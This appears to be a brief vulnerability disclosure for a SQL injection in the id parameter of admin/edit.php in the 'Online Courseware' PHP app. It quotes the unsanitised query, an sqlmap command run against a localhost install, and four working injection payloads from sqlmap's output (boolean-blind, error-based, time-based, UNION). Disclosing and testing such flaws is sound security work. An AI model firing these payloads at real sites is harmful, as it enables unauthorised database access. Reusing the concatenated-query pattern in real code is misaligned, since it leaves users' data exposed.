#### BUG_AUTHOR:LIU WEIYU
## Online Courseware - SQL Injection on (admin/edit.php id parameter) 
### Vendor Homepage:
https://www.sourcecodester.com/php/4818/online-courseware-using-phpmysql.html 
### Version:V1.0
### Tested on: PHP, Apache, MySQL
### Affected Page:
admin/edit.php 

On this page, id parameter is vulnerable to SQL Injection Attack 
### Source code(pcci/admin/edit.php):
```
$id=$_GET['id'];
$results = mysqli_query($conn,"SELECT * FROM student WHERE id='$id'");
```
### Proof of vulnerability(Verify using the sqlmap tool after logining ):
#### -> sqlmap -u http://localhost/onlinecourseware/pcci/admin/edit.php?id=2 --batch
### Output:
```
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 1758=1758 AND 'Ugrm'='Ugrm

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=2' OR (SELECT 6821 FROM(SELECT COUNT(*),CONCAT(0x7170707a71,(SELECT (ELT(6821=6821,1))),0x71766a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Fbkr'='Fbkr

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2' AND (SELECT 3945 FROM (SELECT(SLEEP(5)))vvdL) AND 'ptVW'='ptVW

    Type: UNION query
    Title: Generic UNION query (NULL) - 16 columns
    Payload: id=2' UNION ALL SELECT NULL,NULL,CONCAT(0x7170707a71,0x78477974414d4b646d57614f4b516e727977464f7761666a5266664853557342764244504773726d,0x71766a7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
```
